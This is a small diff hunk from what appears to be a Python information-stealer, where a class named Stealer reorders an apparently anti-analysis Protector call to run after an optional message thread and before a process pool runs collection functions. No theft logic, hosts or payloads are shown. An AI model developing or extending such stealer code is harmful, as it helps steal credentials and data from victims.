@@ -208,10 +208,10 @@ class Stealer(Thread):
 
             sleep(self.__delay)
 
-            Protector(self.__protectors).run()
-
             if self.__message is True:
                 Thread(target=Message().run).start()
+
+            Protector(self.__protectors).run()
 
             with Pool(processes=self.__config.PoolSize) as pool:
                 results = pool.starmap(functions.run_process, [
